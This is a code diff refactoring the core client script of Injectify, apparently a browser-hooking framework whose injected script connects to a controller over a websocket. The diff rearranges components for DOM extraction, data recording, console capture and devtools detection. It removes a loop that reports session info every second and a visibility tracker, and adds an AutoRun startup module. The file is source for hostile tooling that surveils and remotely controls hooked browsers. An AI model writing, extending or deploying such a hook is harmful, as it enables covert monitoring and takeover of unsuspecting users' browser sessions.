@@ -1,16 +1,15 @@
 import { Injectify } from '../definitions/core'
-declare let require, process: any
 import { ws } from './components/Websockets'
 
 // Components
-import Modules from './components/Modules'
-import WindowInjection from './components/WindowInjection'
+import { Modules } from './components/Modules'
 import Console from './components/Console'
 import DOMExtractor from './components/DOMExtractor'
 import DevtoolsListener from './components/Devtools/Listener'
 import * as Websockets from './components/Websockets'
 import DataRecorder from './components/DataRecorder'
 import { Info, SessionInfo } from './components/Info'
+import AutoRun from './components/AutoRun'
 
 // Libraries
 import LoadJS from './lib/LoadJS'
@@ -21,13 +20,13 @@ import Heartbeat from './lib/Heartbeat'
 import Promise from './lib/Promise'
 
 ErrorGuard(() => {
-  let reconnected = !!window['injectify']
+  let reconnected = !!(<any>window).injectify
 
   /**
    * Injectify core API
    * @class
    */
-  window['injectify'] = class Injectify {
+  const injectify = (<any>window).injectify = class Injectify {
     /**
      * Console logging
      */
@@ -108,9 +107,7 @@ ErrorGuard(() => {
     static session = SessionInfo
     static connectTime = +new Date()
 
-    static get debug(): boolean {
-      return ws.url.split('?')[1].charAt(0) == '$'
-    }
+    static debug: boolean = ws.url.split('?')[1].charAt(0) === '$'
 
     static debugLog(
       internalName: string = 'generic',
@@ -175,8 +172,9 @@ ErrorGuard(() => {
     }
 
     static get global(): Injectify.global {
-      if (!(<any>window).inJl1)
-        (<any>window).inJl1 = {
+      return (
+        (<any>window).inJl1 ||
+        ((<any>window).inJl1 = {
           listeners: {
             visibility: false,
             timed: {
@@ -200,8 +198,8 @@ ErrorGuard(() => {
             x: -1,
             y: -1
           }
-        }
-      return (<any>window).inJl1
+        })
+      )
     }
 
     static setState(newState: any) {
@@ -210,19 +208,9 @@ ErrorGuard(() => {
         window['inJl1'][state] = newState[state]
       })
     }
-  }
+  } as typeof Injectify
 
-  /**
-   * Create local reference to window.injectify
-   */
-  let injectify: typeof Injectify = window['injectify']
-
-  // @ts-ignore
-  let global = ((<any>window).global = injectify.global)
-
-  /**
-   * Re-connect events
-   */
+  // Re-connect events
   if (reconnected) {
     /// #if DEBUG
     injectify.debugLog(
@@ -235,9 +223,7 @@ ErrorGuard(() => {
     window.dispatchEvent(new CustomEvent('injectify'))
   }
 
-  /**
-   * Debug helpers
-   */
+  // Debug helpers
   /// #if DEBUG
   injectify.debugLog(
     'core',
@@ -247,14 +233,7 @@ ErrorGuard(() => {
   )
   /// #endif
 
-  /**
-   * Window injection
-   */
-  if (!global.windowInjection) new WindowInjection()
-
-  /**
-   * Replace the basic websocket handler with a feature-rich one
-   */
+  // Replace the basic websocket handler with a feature-rich one
   injectify.listener((data, topic) => {
     switch (topic) {
       case 'cpr': {
@@ -337,70 +316,6 @@ ErrorGuard(() => {
     }
   })
 
-  /**
-   * Page Visibility API
-   */
-  ;(() => {
-    if (injectify.info.platform === 'browser') {
-      /**
-       * Make sure it's not already listening
-       */
-      if (global.listeners.visibility) return
-      /**
-       * Set a global variable to prevent listener from being called multiple times
-       */
-      global.listeners.visibility = true
-
-      let listener
-      let focusChange = () => injectify.session.send()
-
-      /**
-       * Get the correct hidden listener
-       */
-      if ('hidden' in document) {
-        listener = 'visibilitychange'
-      } else if ('mozHidden' in document) {
-        listener = 'mozvisibilitychange'
-      } else if ('webkitHidden' in document) {
-        listener = 'webkitvisibilitychange'
-      } else if ('msHidden' in document) {
-        listener = 'msvisibilitychange'
-      } else {
-        window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
-      }
-      /**
-       * Add listener
-       */
-      if (listener) document.addEventListener(listener, focusChange)
-    }
-  })()
-
-  /**
-   * Console.log overrider
-   * Disabled as it can lock up the server - eg. hacked module
-   */
-  // injectify.console(true);
-
-  /**
-   * Devtools listener
-   */
-  injectify.DevtoolsListener()
-
-  /**
-   * Session info logger
-   */
-  ;(() => {
-    if (global.listeners.timed.active) {
-      return
-    } else {
-      global.listeners.timed.active = true
-      ;(function sessionInfo() {
-        clearTimeout(global.listeners.timed.timer)
-        injectify.session.send()
-        global.listeners.timed.timer = setTimeout(sessionInfo, 1000)
-      })()
-    }
-  })()
-
-  Heartbeat()
+  // Run startup scripts
+  AutoRun()
 }, true)
